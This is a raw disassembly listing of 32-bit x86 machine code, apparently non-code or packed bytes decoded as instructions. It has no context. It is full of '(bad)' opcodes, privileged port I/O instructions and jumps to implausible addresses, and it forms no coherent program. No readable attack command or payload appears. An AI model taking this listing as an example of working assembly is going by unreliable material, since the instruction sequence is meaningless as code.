  414a3f:	add    eax,0x88c617fc
  414a44:	sti    
  414a45:	scas   al,BYTE PTR es:[edi]
  414a46:	or     dh,al
  414a48:	cmp    DWORD PTR [edi+0x197fa4ca],0xffffff99
  414a4f:	shr    cl,cl
  414a51:	daa    
  414a52:	dec    esp
  414a53:	dec    ebp
  414a54:	sub    BYTE PTR [edx+0x73ea39b7],bl
  414a5a:	cmp    esi,ebx
  414a5c:	push   esi
  414a5d:	inc    esp
  414a5e:	fst    QWORD PTR [ecx]
  414a60:	in     eax,0xf7
  414a62:	retf   0xa924
  414a65:	sub    edx,DWORD PTR [ebp+0x61]
  414a68:	fnstsw WORD PTR [edi+edi*1+0x41]
  414a6c:	repnz xor eax,0x4f9e5120
  414a72:	sti    
  414a73:	outs   dx,BYTE PTR ds:[esi]
  414a74:	ficom  WORD PTR [esi]
  414a76:	adc    ah,dh
  414a78:	(bad)  
  414a79:	mov    ebp,0xc4e279e1
  414a7e:	mov    al,0xca
  414a80:	cmp    cl,BYTE PTR [edx+ecx*8-0x56406f4b]
  414a87:	push   edx
  414a88:	ror    DWORD PTR es:[esi],cl
  414a8b:	sahf   
  414a8c:	sub    dl,ch
  414a8e:	dec    eax
  414a8f:	push   esp
  414a90:	adc    ch,al
  414a92:	mov    dl,BYTE PTR [edx]
  414a94:	dec    edx
  414a95:	(bad)  
  414a97:	and    eax,0xf3de25dd
  414a9c:	call   0xf5963690
  414aa1:	xor    cl,BYTE PTR [ebp+0x16]
  414aa4:	inc    ebx
  414aa5:	adc    DWORD PTR [ecx-0x13],ecx
  414aa8:	sahf   
  414aa9:	dec    eax
  414aaa:	sbb    eax,0x14b164ca
  414aaf:	xor    eax,0x28d6b89f
  414ab4:	jg     0x414a5d
  414ab6:	sbb    BYTE PTR [ebx+ebp*8],bh
  414ab9:	and    ebx,DWORD PTR [ebx-0x49]
  414abc:	aad    0xec
  414abe:	inc    eax
  414abf:	lahf   
  414ac0:	inc    esp
  414ac1:	cmc    
  414ac2:	dec    ebx
  414ac3:	and    DWORD PTR [edx+0x2a],edi
  414ac6:	or     al,0xb4
  414ac8:	fdiv   st(4),st
  414aca:	rcr    ch,1
  414acc:	(bad)  
  414acd:	mov    al,0xdd
  414acf:	mov    dh,0x10
  414ad1:	jo     0x414b52
  414ad3:	push   0xffffffa2
  414ad5:	or     DWORD PTR [edx-0x37],ecx
  414ad8:	mov    ecx,0x4d2443f3
  414add:	xor    DWORD PTR [edi+edx*2-0x60],eax
  414ae1:	std    
  414ae2:	sbb    ebx,DWORD PTR [ebx]
  414ae4:	or     eax,0x78c5780a
  414ae9:	pop    ebx
  414aea:	inc    edx
  414aeb:	xchg   edi,eax
  414aec:	ror    esi,1
  414aee:	lds    ecx,FWORD PTR [edi]
  414af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af1:	test   BYTE PTR fs:[eax+0x4d],cl
  414af5:	int    0x38
  414af7:	sbb    eax,0x7ba03e70
  414afc:	mov    dh,0x3f
  414afe:	daa    
  414aff:	mov    esp,0x2593f96c
  414b04:	sbb    al,0xc7
  414b06:	or     DWORD PTR [ebx],esp
  414b08:	jnp    0x414b12
  414b0a:	push   di
  414b0c:	mov    ebp,0x30466466
  414b11:	cmc    
  414b12:	push   ecx
  414b13:	sbb    al,0x36
  414b15:	fcomp  QWORD PTR [edi-0x4ac8ad7b]
  414b1b:	jmp    0x414aa5
  414b1d:	sbb    esi,DWORD PTR [esi]
  414b1f:	jae    0x414b8b
  414b21:	loop   0x414b91
  414b23:	sbb    eax,0xe436f87d
  414b28:	cdq    
  414b29:	dec    ecx
  414b2a:	jbe    0x414ac6
  414b2c:	sub    DWORD PTR [edx-0x59efa597],0xfffffff6
  414b33:	sbb    DWORD PTR [ebp-0x213c0e19],esp
  414b39:	mov    ebp,edi
  414b3b:	jne    0x414af9
  414b3d:	pop    esi
  414b3e:	pop    ebp
  414b3f:	icebp  
  414b40:	popa   
  414b41:	jae    0x414bbd
  414b43:	xchg   esp,eax
  414b44:	push   esi
  414b45:	pushf  
  414b46:	add    BYTE PTR [ecx+0x4c4f1c25],0x34
  414b4d:	mov    BYTE PTR [edx],bh
  414b4f:	test   DWORD PTR [eax],ecx
  414b51:	mov    edx,0x7b87de6e
  414b56:	in     eax,0x2c
  414b58:	adc    eax,DWORD PTR [ecx-0x6]
  414b5b:	cdq    
  414b5c:	xchg   esp,eax
  414b5d:	jp     0x414b0c
  414b5f:	int3   
  414b60:	mov    esi,0xe66cdddb
  414b65:	jle    0x414b44
  414b67:	ins    BYTE PTR es:[edi],dx
  414b68:	bound  esp,QWORD PTR [edx+ebp*1-0x42]
  414b6c:	jbe    0x414bd1
  414b6e:	xchg   ebx,eax
  414b6f:	neg    DWORD PTR [ecx-0x7f5f3265]
  414b75:	xor    BYTE PTR [ebp-0x6],dl
  414b78:	mov    dl,0x3e
  414b7a:	sbb    BYTE PTR [esi-0x649da28b],al
  414b80:	jbe    0x414b6f
  414b82:	aad    0xaa
  414b84:	xchg   BYTE PTR [eax],al
  414b86:	cmp    BYTE PTR [edi-0x5a7316ec],0x59
  414b8d:	xchg   ebp,eax
  414b8e:	pop    esi
  414b8f:	hlt    
  414b90:	pusha  
  414b91:	test   al,0xf1
  414b93:	adc    al,BYTE PTR gs:[ebx-0x16]
  414b97:	xchg   ebx,eax
  414b98:	mov    eax,ds:0xaf1e1da5
  414b9d:	mov    eax,ds:0x70bb7893
  414ba2:	shl    ebx,0x23
  414ba5:	and    edx,DWORD PTR [ebx]
  414ba7:	mov    edx,0x3f84ca83
  414bac:	test   BYTE PTR [esp+edi*8+0x7f],0x49
  414bb1:	cmp    eax,0x61cf88bb
  414bb6:	jns    0x414b5d
  414bb8:	fwait
  414bb9:	in     al,0x57
  414bbb:	mov    WORD PTR [ebp-0x706ab3f7],gs
  414bc1:	xchg   ebp,eax
  414bc2:	cmp    eax,0x70fe1200
  414bc7:	xchg   ebp,eax
  414bc8:	sahf   
  414bc9:	adc    DWORD PTR ds:0xcbc0b5a2,edi
  414bcf:	push   ebp
  414bd0:	test   ecx,edi
  414bd2:	gs xchg esi,eax
  414bd4:	pusha  
  414bd5:	outs   dx,DWORD PTR ds:[esi]
  414bd6:	(bad)  
  414bd7:	push   ebx
  414bd8:	dec    edi
  414bd9:	mov    edx,0x7dca31
  414bde:	dec    esi
  414bdf:	test   al,0x79
  414be1:	jb     0x414b87
  414be3:	mov    al,0xcb
  414be5:	out    0xda,al
  414be7:	xchg   esp,eax
  414be8:	mov    dl,0x3f
  414bea:	lods   eax,DWORD PTR ds:[esi]
  414beb:	add    al,0x10
  414bed:	mov    BYTE PTR [ecx+0x6f],ah
  414bf0:	sub    cl,BYTE PTR [ecx]
  414bf2:	inc    edx
  414bf3:	ins    BYTE PTR es:[edi],dx
  414bf4:	iret   
  414bf5:	push   cs
  414bf6:	fwait
  414bf7:	mov    dh,0x45
  414bf9:	outs   dx,BYTE PTR ds:[esi]
  414bfa:	das    
  414bfb:	rcl    al,0x53
  414bfe:	xor    ebx,eax
  414c00:	dec    ebx
  414c01:	pop    ecx
  414c02:	adc    BYTE PTR [edx+0x45a3ee08],dh
  414c08:	aam    0x6b
  414c0a:	sub    al,0x67
  414c0c:	daa    
  414c0d:	(bad)  
  414c0e:	pop    ds
  414c0f:	mov    ecx,0xf7109207
  414c14:	lahf   
  414c15:	les    ecx,FWORD PTR ds:0x32e5eb48
  414c1b:	mov    dl,0xe1
  414c1d:	out    dx,eax
  414c1e:	cs aaa 
  414c20:	cmp    BYTE PTR [edx-0x45a90d63],bh
  414c26:	push   cs
  414c27:	push   esi
  414c28:	in     al,dx
  414c29:	and    eax,0xdf3e4ab8
  414c2e:	stos   DWORD PTR es:[edi],eax
  414c2f:	push   eax
  414c30:	std    
  414c31:	dec    ebp
  414c32:	test   BYTE PTR [edi],0x13
  414c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c36:	std    
  414c37:	nop
  414c38:	cmp    ecx,DWORD PTR [edi-0x1f737078]
  414c3e:	js     0x414c20
  414c40:	adc    eax,0x7278e9a5
  414c45:	adc    DWORD PTR [ecx],eax
  414c47:	add    al,BYTE PTR [ebx+0x6117486f]
  414c4d:	xchg   edx,eax
  414c4e:	test   ah,0x6
  414c51:	xchg   ebx,ebx
  414c53:	add    eax,0x5d854cca
  414c58:	push   es
  414c59:	xchg   BYTE PTR [edx+0x689f63e0],cl
  414c5f:	repnz popa 
  414c61:	sub    eax,edx
  414c63:	fcomp  QWORD PTR [edx+0x3ee87c2]
  414c69:	mov    esi,0x64ac1159
  414c6e:	cmp    al,0x6d
  414c70:	xor    BYTE PTR [edi+0x4c9698e2],bl
  414c76:	adc    cl,dh
  414c78:	in     al,0x50
  414c7a:	int3   
  414c7b:	lahf   
  414c7c:	or     ebx,DWORD PTR [esi]
  414c7e:	pop    edx
  414c7f:	jp     0x414c93
  414c81:	inc    esp
  414c82:	stos   BYTE PTR es:[edi],al
  414c83:	rol    DWORD PTR [ebp+0x1f],0xc2
  414c87:	xchg   esp,eax
  414c88:	cmc    
  414c89:	retf   
  414c8a:	iret   
  414c8b:	adc    BYTE PTR ds:0x675467ea,dl
  414c91:	push   ebx
  414c92:	and    eax,0x66743402
  414c97:	pop    ecx
  414c98:	or     eax,0x3dd57e11
  414c9d:	std    
  414c9e:	sahf   
  414c9f:	out    0x59,eax
  414ca1:	dec    edi
  414ca2:	cdq    
  414ca3:	fidivr WORD PTR [eax]
  414ca5:	push   ecx
  414ca6:	cmp    ebx,DWORD PTR [edx+eiz*4+0x6]
  414caa:	sbb    esp,DWORD PTR es:[edx-0x16fdb46c]
  414cb1:	mov    ds,WORD PTR [edx-0x64]
  414cb4:	xchg   DWORD PTR fs:[ebx-0x48],esi
  414cb8:	gs cmp eax,0x2fdb37c
  414cbe:	repnz push 0xffffffd8
  414cc1:	xor    al,0xf6
  414cc3:	aas    
  414cc4:	dec    edi
  414cc5:	pushf  
  414cc6:	js     0x414c99
  414cc8:	pop    ebx
  414cc9:	retf   0x21d6
  414ccc:	inc    esi
  414ccd:	stos   BYTE PTR es:[edi],al
  414cce:	imul   eax,DWORD PTR [ecx+0x5c],0x1c
  414cd2:	jb     0x414cfa
  414cd4:	mov    ebx,edi
  414cd6:	(bad)  
  414cd7:	das    
  414cd8:	loopne 0x414c9b
  414cda:	xor    al,ah
  414cdc:	cwde   
  414cdd:	sbb    eax,0x47b88462
  414ce2:	leave  
  414ce3:	xlat   BYTE PTR ds:[ebx]
  414ce4:	repnz repz push esp
  414ce7:	(bad)  
  414ce8:	fisubr WORD PTR [eax+edi*8]
  414ceb:	lods   al,BYTE PTR ds:[esi]
  414cec:	add    DWORD PTR [ecx+0x6cdb8181],esp
  414cf2:	mul    ecx
  414cf4:	icebp  
  414cf5:	xor    BYTE PTR ds:0x23d96868,dl
  414cfb:	je     0x414caa
  414cfd:	sbb    DWORD PTR [ebp*1-0x70b48ca5],edi
  414d04:	ror    ecx,1
  414d06:	std    
  414d07:	and    al,0x5
  414d09:	rcr    DWORD PTR [edi-0x3902c2c7],cl
  414d0f:	inc    esi
  414d10:	aam    0x13
  414d12:	loop   0x414d4e
  414d14:	leave  
  414d15:	cdq    
  414d16:	sbb    eax,0xec313190
  414d1b:	std    
  414d1c:	mov    ecx,0x5ce23901
  414d21:	push   edx
  414d22:	add    edx,DWORD PTR [eax]
  414d24:	nop
  414d25:	aam    0x51
  414d27:	push   ebx
  414d28:	daa    
  414d29:	xor    al,bh
  414d2b:	mov    ds:0x49696150,al
  414d30:	dec    eax
  414d31:	sbb    edi,DWORD PTR [esi]
  414d33:	dec    esp
  414d34:	jl     0x414d0d
  414d36:	push   cs
  414d37:	lods   eax,DWORD PTR ds:[esi]
  414d38:	inc    ebp
  414d39:	cmp    DWORD PTR [edx],ebx
  414d3b:	mov    WORD PTR [esi-0x77d8a3ae],ds
  414d41:	fmul   st(2),st
  414d43:	aam    0x53
  414d45:	stos   BYTE PTR es:[edi],al
  414d46:	sbb    al,0x37
  414d48:	and    ebx,esi
  414d4a:	dec    esi
  414d4b:	stos   BYTE PTR es:[edi],al
  414d4c:	mov    edx,0xd7cb4684
  414d51:	pushf  
  414d52:	dec    ecx
  414d53:	pop    edi
  414d54:	xor    DWORD PTR [ebp-0x5285f90b],ebx
  414d5a:	jnp    0xdadcbf55
  414d60:	mov    edi,DWORD PTR [edi-0xfacd78a]
  414d66:	retf   0x26f5
  414d69:	xor    edi,DWORD PTR ds:[ebp+0x5d43808f]
  414d70:	xor    ebx,DWORD PTR [ecx+0x77c6d630]
  414d76:	mov    ah,0xbe
  414d78:	jle    0x414d3e
  414d7a:	adc    ch,cl
  414d7c:	mov    ds,WORD PTR [ecx]
  414d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d7f:	mov    dl,0x11
  414d81:	pusha  
  414d82:	sbb    BYTE PTR [ecx],bl
  414d84:	cmp    esi,DWORD PTR [ecx+0x16]
  414d87:	loopne 0x414dbd
  414d89:	xchg   edi,eax
  414d8a:	push   0xd69f9906
  414d8f:	mov    BYTE PTR [ebx-0x28],al
  414d92:	out    0xb4,al
  414d94:	and    al,0x9d
  414d96:	pushf  
  414d97:	jno    0x414db3
  414d99:	fcomp  QWORD PTR ds:0x6dc31782
  414d9f:	and    ah,BYTE PTR [edx]
  414da1:	scas   al,BYTE PTR es:[edi]
  414da2:	pop    ds
  414da3:	addr16 mov eax,ds:0x812a
  414da7:	ds adc al,0xea
  414daa:	sub    ecx,ecx
  414dac:	sub    esi,edx
  414dae:	lods   al,BYTE PTR ds:[esi]
  414daf:	jmp    0x2d0a85e6
  414db4:	stc    
  414db5:	(bad)  
  414db6:	xchg   esp,eax
  414db7:	push   edi
  414db8:	ins    BYTE PTR es:[edi],dx
  414db9:	jmp    0xc01a:0xc05e36e7
  414dc0:	je     0x414def
  414dc2:	mov    ds:0x11991d14,al
  414dc7:	sar    BYTE PTR [edx-0xde97d82],1
  414dcd:	mov    ds:0x596487b6,eax
  414dd2:	(bad)
  414dd6:	les    ecx,FWORD PTR [edi+0x44]
  414dd9:	lods   al,BYTE PTR ds:[esi]
  414dda:	and    dl,bl
  414ddc:	and    eax,0x884877bc
  414de1:	jecxz  0x414d93
  414de3:	xchg   esp,eax
  414de4:	gs xchg edi,eax
  414de6:	mov    DWORD PTR [esi],ebp
  414de8:	(bad)  
  414de9:	fucomi st,st(4)
  414deb:	mov    bl,0x8f
  414ded:	shr    DWORD PTR [esi],cl
  414def:	pop    ebx
  414df0:	or     eax,0x68a4393
  414df5:	mov    al,al
  414df7:	sbb    DWORD PTR [edx-0x57d2b6eb],esp
  414dfd:	push   es
  414dfe:	add    eax,0x7ef7a1c3
  414e03:	js     0x414d9a
  414e05:	mov    eax,ds:0x90c75f3a
  414e0a:	jmp    FWORD PTR [edi-0xcd5a36d]
  414e10:	mov    eax,ds:0x17eb29f5
  414e15:	mov    esi,0xb33ff316
  414e1a:	scas   al,BYTE PTR es:[edi]
  414e1b:	bound  eax,QWORD PTR [edi]
  414e1d:	xchg   ecx,eax
  414e1e:	bound  edx,QWORD PTR ds:0x8a7e618f
  414e24:	cmp    al,0x9e
  414e26:	and    ebp,esi
  414e28:	and    DWORD PTR [ecx+0x32e1da3d],eax
  414e2e:	mov    esi,0xf2e811b8
  414e33:	stos   DWORD PTR es:[edi],eax
  414e34:	cmp    DWORD PTR [esi+edx*8-0x34],ebp
  414e38:	jmp    0x174d371c
  414e3d:	xchg   esi,eax
  414e3e:	cmp    al,0xdc
  414e40:	adc    eax,0xdf3a20a4
  414e45:	lahf   
  414e46:	pop    ecx
  414e47:	inc    edi
  414e48:	xor    ebp,esp
  414e4a:	and    edx,esp
  414e4c:	push   esp
  414e4d:	jg     0x414e99
  414e4f:	or     al,0x40
  414e51:	jmp    0x702c2750
  414e56:	push   0x4
  414e58:	xchg   ebx,eax
  414e59:	test   DWORD PTR [edx-0x61c1f04a],ebp
  414e5f:	inc    edi
  414e60:	mov    al,ds:0xc186745b
  414e65:	xlat   BYTE PTR ds:[ebx]
  414e66:	lea    esp,[esi]
  414e68:	add    ebx,DWORD PTR gs:[edx+ecx*4]
  414e6c:	mov    al,ds:0x28a4f4ce
  414e71:	repz cmp edx,ebp
  414e74:	in     al,dx
  414e75:	inc    esi
  414e76:	xchg   ebx,eax
  414e77:	push   ebx
  414e78:	iret   
  414e79:	adc    al,0xf0
  414e7b:	xchg   ecx,eax
  414e7c:	pushf  
  414e7d:	add    DWORD PTR [edi],ebx
  414e7f:	rol    DWORD PTR [ebp+0x6aec100f],0x9b
  414e86:	adc    BYTE PTR [ecx+esi*8-0x11],dl
  414e8a:	mov    bl,0x98
  414e8c:	jnp    0x414eb6
  414e8e:	sbb    BYTE PTR [eax],bl
  414e90:	ss ds loopne 0x414ee9
  414e94:	jbe    0x414e39
  414e96:	std    
  414e97:	cld    
  414e98:	mov    eax,ds:0x50ce76a0
  414e9d:	mov    edi,cs
  414e9f:	lods   al,BYTE PTR ds:[esi]
  414ea0:	push   0x1cfaa9ef
  414ea5:	int3   
  414ea6:	mov    ebx,0x9e4bf572
  414eab:	adc    eax,0x8335ee2d
  414eb0:	xor    esp,DWORD PTR [ecx+0x4d]
  414eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb4:	scas   eax,DWORD PTR es:[edi]
  414eb5:	leave  
  414eb6:	mov    ds:0xc40db1cf,al
  414ebb:	ins    BYTE PTR es:[edi],dx
  414ebc:	hlt    
  414ebd:	add    DWORD PTR [edx+0x6],0xffffffca
  414ec1:	jno    0x414f3a
  414ec3:	je     0x414ec3
  414ec5:	int3   
  414ec6:	in     al,dx
  414ec7:	lahf   
  414ec8:	xor    BYTE PTR [edx+0x2c],al
  414ecb:	mov    al,ds:0xd75da80a
  414ed0:	push   edx
  414ed1:	imul   esi
  414ed3:	xchg   esi,eax
  414ed4:	jl     0x414f39
  414ed6:	mov    al,ds:0x331d5c9e
  414edb:	mov    ch,0x33
  414edd:	loop   0x414f5b
  414edf:	outs   dx,DWORD PTR ds:[esi]
  414ee0:	inc    ebx
  414ee1:	and    bl,BYTE PTR [ebx-0x5f73509b]
  414ee7:	xchg   esi,eax
  414ee8:	repz sbb BYTE PTR [ecx],dh
  414eeb:	add    eax,0x5613ab71
  414ef0:	dec    esi
  414ef1:	adc    dh,bl
  414ef3:	setae  al
  414ef6:	or     ebx,esp
  414ef8:	mov    edi,0xb7f758f
  414efd:	aas    
  414efe:	mov    ds:0xb92b36ea,eax
  414f03:	repnz adc DWORD PTR [ecx-0x21],eax
  414f07:	rol    esi,cl
  414f09:	add    dl,BYTE PTR [edx+0x20316941]
  414f0f:	ss mov edx,0x2d7f31e9
  414f15:	mov    al,ds:0x7306c793
  414f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f1b:	shl    DWORD PTR [ebx],0x3
  414f1e:	ds xchg ebx,eax
  414f20:	mov    bh,0x68
  414f22:	ins    DWORD PTR es:[edi],dx
  414f23:	cmp    al,0xaf
  414f26:	dec    edx
  414f27:	retf   
  414f28:	pop    ss
  414f29:	xor    al,0x91
  414f2b:	sbb    DWORD PTR [edx],eax
  414f2d:	fcomp  st(6)
  414f2f:	(bad)  
  414f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f32:	mov    al,0xd9
  414f34:	sub    DWORD PTR ds:0x12241d18,ebx
  414f3a:	es (bad) 
  414f3c:	sti    
  414f3d:	pusha  
  414f3e:	push   edi
  414f3f:	idiv   BYTE PTR [esp+eax*1-0xfa6643f]
  414f46:	ins    DWORD PTR es:[edi],dx
  414f47:	ins    BYTE PTR es:[edi],dx
  414f48:	aaa    
  414f49:	(bad)  
  414f4a:	mov    ds:0xe39b970c,al
  414f4f:	inc    BYTE PTR [eax+ebx*4]
  414f52:	std    
  414f53:	xchg   edi,eax
  414f54:	jp     0x414f5a
  414f56:	in     al,0xbb
  414f58:	sub    DWORD PTR [esi],esp
  414f5a:	sti    
  414f5b:	fwait
  414f5c:	push   0x22bf2d0c
  414f61:	xchg   ebx,edx
  414f63:	call   0x3b:0x93c5786b
  414f6a:	push   es
  414f6b:	ds push cs
  414f6d:	push   edi
  414f6e:	fnop   
  414f70:	and    cl,BYTE PTR [ecx]
  414f72:	in     al,dx
  414f73:	pusha  
  414f74:	dec    ebx
  414f75:	and    esi,DWORD PTR [edi]
  414f77:	loopne 0x414f08
  414f79:	mov    dl,bl
  414f7b:	icebp  
  414f7c:	enter  0x665e,0x17
  414f80:	push   ds
  414f81:	pushf  
  414f82:	jle    0x414fec
  414f84:	mov    cl,0x7d
  414f86:	into   
  414f87:	or     cl,ch
  414f89:	sahf   
  414f8a:	xchg   esp,eax
  414f8b:	add    al,0x14
  414f8d:	sub    al,0x10
  414f8f:	cdq    
  414f90:	add    bh,BYTE PTR [edi+0x21]
  414f93:	xor    DWORD PTR [esi-0x5a582d96],0xffffffea
  414f9a:	js     0x41500c
  414f9c:	cmp    DWORD PTR [edx],ecx
  414f9e:	hlt    
  414f9f:	inc    esi
  414fa0:	mov    al,ds:0x396a2f17
  414fa5:	or     ecx,DWORD PTR [ecx]
  414fa7:	das    
  414fa8:	int3   
  414fa9:	mov    ds:0xf711da1b,eax
  414fae:	mov    ecx,DWORD PTR [ebx-0x7d]
  414fb1:	sub    BYTE PTR [ecx-0x74],ch
  414fb4:	dec    edx
  414fb5:	int    0xc1
  414fb7:	jmp    0xd319dc7e
  414fbc:	sbb    eax,0x692b6aca
  414fc1:	jge    0x414f95
  414fc3:	and    cl,al
  414fc5:	retf   
  414fc6:	and    eax,0x23e8e6d2
  414fcb:	add    BYTE PTR [edx],bl
  414fcd:	xchg   edx,eax
  414fce:	in     eax,dx
  414fcf:	out    dx,al
  414fd0:	and    BYTE PTR [eax+0x22],0x4c
  414fd4:	push   cs
  414fd5:	xor    eax,DWORD PTR [eax]
  414fd7:	lahf   
  414fd8:	add    edi,DWORD PTR [esi]
  414fda:	xlat   BYTE PTR ds:[ebx]
  414fdb:	inc    esi
  414fdc:	enter  0x1d24,0x12
  414fe0:	bound  ecx,QWORD PTR [eax]
  414fe2:	add    BYTE PTR [ecx],dh
  414fe4:	scas   eax,DWORD PTR es:[edi]
  414fe5:	adc    bl,dh
  414fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe8:	pop    es
  414fe9:	add    DWORD PTR [edi],ebp
  414feb:	xchg   esi,eax
  414fec:	retf   
  414fed:	sbb    BYTE PTR [edi],0xf6
  414ff0:	stos   BYTE PTR es:[edi],al
  414ff1:	scas   eax,DWORD PTR es:[edi]
  414ff2:	mov    al,ds:0x6c6c8a5c
  414ff7:	call   0x7d5cebc4
  414ffc:	xchg   DWORD PTR [ebx+0x1c],ebp
  414fff:	dec    edi
  415000:	shl    DWORD PTR [ecx-0x19],0x15
  415004:	arpl   sp,ax
  415006:	add    bh,ah
  415008:	inc    edi
  415009:	jnp    0x41502f
  41500b:	jne    0x414fd3
  41500d:	fdivr  QWORD PTR [edx+ecx*2+0x3d]
  415011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415012:	push   0xffffffd0
  415014:	retf   
  415015:	and    esi,DWORD PTR [eax+0xd8e9b4f]
  41501b:	mov    eax,ds:0xf6c67777
  415020:	rcr    DWORD PTR [ebx-0x257e5dc5],cl
  415026:	xor    al,BYTE PTR [ebx]
  415028:	lds    esp,FWORD PTR [edi+0x35]
  41502b:	lock add al,0xb1
  41502e:	(bad)  
  415030:	add    BYTE PTR [eax+ebp*1],ah
  415033:	pop    ecx
  415034:	sbb    DWORD PTR [esi-0x7c229727],ebx
  41503a:	or     dh,BYTE PTR ds:0x5cbaf41c
  415040:	lods   eax,DWORD PTR ds:[esi]
  415041:	mov    BYTE PTR [edi+0x1b02571d],ah
  415047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415048:	arpl   sp,dx
  41504a:	add    al,0xfa
  41504c:	sbb    al,0xe2
  41504e:	mov    bh,0x79
  415050:	fist   WORD PTR [ecx+0x440a27b5]
  415056:	dec    ecx
  415057:	and    esi,esi
  415059:	sbb    al,0x57
  41505b:	mov    ds:0xb18fd7c4,eax
  415060:	pop    eax
  415061:	loope  0x4150b9
  415063:	push   eax
  415064:	imul   eax,DWORD PTR [ebx+0x4d],0xafca8f93
  41506b:	fimul  DWORD PTR [esi+0x520ba9d1]
  415071:	clc    
  415072:	out    0xe,eax
  415074:	xchg   ebx,eax
  415075:	sti    
  415076:	mov    ecx,0xd0b439dd
  41507b:	add    dl,al
  41507d:	mov    dh,0x36
  41507f:	mov    edx,0x294108be
  415084:	mov    edx,DWORD PTR [edi-0x3ace3b55]
  41508a:	xor    dh,BYTE PTR [ebx-0x55]
  41508d:	call   0xce47:0xa22e41dd
  415094:	aaa    
  415095:	add    bh,bl
  415097:	iret   
  415098:	mov    dl,0x80
  41509a:	jno    0x4150fb
  41509c:	push   eax
  41509d:	xchg   edi,eax
  41509e:	mov    al,ds:0x9bfa0e48
  4150a3:	call   0x919b:0x4ed686ae
  4150aa:	lahf   
  4150ab:	mov    edx,DWORD PTR [edx-0x77]
  4150ae:	inc    eax
  4150af:	xor    esi,edi
  4150b1:	add    esp,DWORD PTR [ebp+0x3d]
  4150b4:	cmp    DWORD PTR [esi],0x1bc2b322
  4150ba:	not    BYTE PTR [ebp+0x78]
  4150bd:	mov    cl,0xa8
  4150bf:	cld    
  4150c0:	or     DWORD PTR [esi],esi
  4150c2:	fmul   st,st(2)
  4150c4:	int3   
  4150c5:	sub    esi,DWORD PTR [ecx-0x54797efb]
  4150cb:	imul   eax,DWORD PTR [edx-0x5537c5e],0x1a
  4150d2:	outs   dx,DWORD PTR ds:[esi]
  4150d3:	in     al,0x9f
  4150d5:	cdq    
  4150d6:	(bad)  
  4150d7:	ret    
  4150d8:	das    
  4150d9:	add    DWORD PTR ds:0xed8b8799,esi
  4150df:	ret    
  4150e0:	or     BYTE PTR [eax],dl
  4150e2:	ins    BYTE PTR es:[edi],dx
  4150e3:	add    esp,esp
  4150e5:	ds sub al,0x36
  4150e8:	mov    bl,0x94
  4150ea:	xor    DWORD PTR ss:[esp+esi*4+0x67],esp
  4150ef:	shl    BYTE PTR [esi],1
  4150f1:	cmp    dh,BYTE PTR ds:0xa75c11a0
  4150f7:	pop    ss
  4150f8:	shl    BYTE PTR [edx-0xd53db22],cl
  4150fe:	mov    ah,0x9b
  415100:	or     esi,edx
  415102:	pop    ss
  415103:	push   ds
  415104:	xchg   ebp,eax
  415105:	jp     0x415183
  415107:	std    
  415108:	sbb    DWORD PTR [ebp+0x5e],0x7a
  41510c:	pop    esi
  41510d:	scas   al,BYTE PTR es:[edi]
  41510e:	pop    edx
  41510f:	or     DWORD PTR [esi-0x3c391a66],eax
  415115:	mov    edx,0xbbd4492
  41511a:	(bad)  
  41511b:	in     al,dx
  41511c:	pop    es
  41511d:	test   esp,0x4e18ae08
  415123:	cmp    al,0x43
  415125:	sub    al,0x51
  415127:	in     al,dx
  415128:	jg     0x415131
  41512a:	fsubr  st(3),st
  41512c:	xor    cl,0x1f
  41512f:	rol    al,cl
  415131:	daa    
  415132:	cmp    edx,DWORD PTR [ebx+0x37]
  415135:	sbb    esp,DWORD PTR [esi]
  415137:	inc    edx
  415138:	inc    esi
  415139:	in     eax,0xf1
  41513b:	out    dx,eax
  41513c:	mov    WORD PTR [esi+0x4098cca1],es
  415142:	mov    al,ds:0x28504060
  415147:	xchg   DWORD PTR [edx-0x5a],esp
  41514a:	or     DWORD PTR [ecx-0x3c],ebx
  41514d:	inc    ecx
  41514e:	jg     0x415119
  415150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415151:	pop    edx
  415152:	fwait
  415153:	pop    ecx
  415154:	ret    0x46f9
  415157:	int3   
  415158:	push   ebp
  415159:	jge    0x41516d
  41515b:	cmc    
  41515c:	(bad)  
  41515d:	loop   0x4151d7
  41515f:	mov    DWORD PTR [ebp-0x3ed6d8a6],eax
  415165:	and    eax,0xe81534c1
  41516a:	push   0x3b53fd7c
  41516f:	sar    DWORD PTR [ebx],0x6c
  415172:	xchg   esi,eax
  415173:	xchg   esi,eax
  415174:	mov    al,0xed
  415176:	and    DWORD PTR [ebp-0x544759e0],ebp
  41517c:	std    
  41517d:	xchg   ecx,eax
  41517e:	aad    0x4d
  415180:	add    al,0x80
  415182:	pop    es
  415183:	scas   al,BYTE PTR es:[edi]
  415184:	xor    eax,0xc220f0c8
  415189:	test   BYTE PTR [edi+0x45],0x72
  41518d:	ss ficom WORD PTR es:[ebx]
  415191:	adc    eax,0xa0ffd01b
  415196:	mov    dl,0xdd
  415198:	inc    eax
  415199:	or     al,0x73
  41519b:	push   esi
  41519c:	rcr    DWORD PTR [edx],cl
  41519e:	imul   eax,DWORD PTR [ebx+0x566cb55a],0xffffffb4
  4151a5:	pop    eax
  4151a6:	push   0x71
  4151a8:	jecxz  0x415155
  4151aa:	mov    DWORD PTR [ecx-0x6d],ecx
  4151ad:	in     eax,0x69
  4151af:	sbb    edi,DWORD PTR [edx-0x7f]
  4151b2:	fistp  DWORD PTR [edx-0x80]
  4151b5:	add    bh,cl
  4151b7:	pop    eax
  4151b9:	sbb    eax,0x93e2757e
  4151be:	inc    edx
  4151bf:	lock pushf 
  4151c1:	out    0x4c,al
  4151c3:	xor    al,0xc4
  4151c5:	cmp    eax,0x4668e1b1
  4151ca:	add    eax,0x72ea02f2
  4151cf:	jbe    0x4151d0
  4151d1:	sub    eax,0x87dec8e7
  4151d6:	inc    edi
  4151d7:	sub    cl,BYTE PTR [edx]
  4151d9:	bound  esi,QWORD PTR [edx]
  4151db:	leave  
